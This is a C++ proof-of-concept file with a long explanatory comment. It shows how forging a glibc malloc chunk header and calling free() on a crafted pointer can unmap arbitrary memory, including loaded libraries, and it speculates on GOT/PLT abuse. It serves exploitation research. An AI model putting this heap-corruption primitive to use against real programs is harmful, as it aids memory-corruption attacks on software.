/* glibc unmap example
 *
 * This is not a super functional example and mostly
 * just a demonstration that you can trigger the 
 * unmapping of other sections of memory by abusing
 * free(). Depeding on the value of siz, its actually
 * possible to unmap mostly the address space and segfault
 * upon return, or segfault on the next libc call. 
 *
 * Depending on the precise layout of the application and
 * the siz of the unmapping, you can CHANGE THE BASE ADDRESS
 * for pre-existing modules. It seems like this might be useful
 * to replicate GOT/PLT writes in lazy bound applications or
 * similar, but that hasn't been overly explored.
 *
 * Furthermore, realloc() can be utilized in a similar manner,
 * however it is more likely to fail. There are some interesting
 * code paths inside of the mremap system call (as of 4.0.0) that
 * could cause it to return the pointer in question, so in some
 * bizarre scenario it may be possible to confuse an application
 * into allocating a pointer already allocated, however you would
 * need to have control of the pointer when it went into realloc
 * and at least set the mmap flag (0x02) at 
 * ptr-sizeof(struct malloc_chunk)+sizeof(size_t) which makes the
 * idea mostly useless.
 *
 * munmap is more useful, especially for large mappings because
 * they will tend to fall towards the beginning of the address
 * space preceeding the first loaded module, thus you can
 * manipulate the location and mappings of the entire address 
 * space this way, and as I said, possibly, potentially cause
 * GOT/PLT type SNAFUs, although that was unexplored.
 *
 * The major caveat that makes this generally unrealistic
 * is that you need to have control of the pointer passed to free()
 * and be able to ensure that the map flag is set and that the
 * pointer minus the prev_size bitwise or'd with the pointer 
 * plus the prev_size plus the mapping size is aligned properly. 
 * There is no check to ensure this arithmetic does not wrap around
 * the address space, however at times the masking of low-order bits
 * is problematic.
 *
 * At any rate, im sure in some weird set of exploitation circumstances
 * this knowledge could provide rather useful.
 */

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <string>
#include <unistd.h>

signed int 
main(void)
{
	char* 	ptr = nullptr; 
	char*	dst = nullptr; 
	size_t*	siz = nullptr;

	malloc(1);
	for (size_t idx = 0; idx < 5; idx++) {
		ptr = static_cast< char* >(malloc(1024 * 1024 * 1024));
		dst = ptr+(4096-16);
		std::memcpy(dst, ptr-16, 16);
		siz  = reinterpret_cast< size_t* >(dst);
		*siz = 1024*1024*1024+512*1024; //+256*1024*1024; 
		dst += 16;
		free(dst);
	}

	// the _exit() is because we almost certainly
	// screwed up the loaded libraries in such a 
	// manner that the application segfaults when
	// their destructors are called...because data
	// or their instructions no longer exist.
	//
	// Yes, you can unmap loaded libraries, you can
	// unmap lots of them at the same time without
	// the loader being aware of it.
	_exit(EXIT_SUCCESS);
	return EXIT_SUCCESS;
}
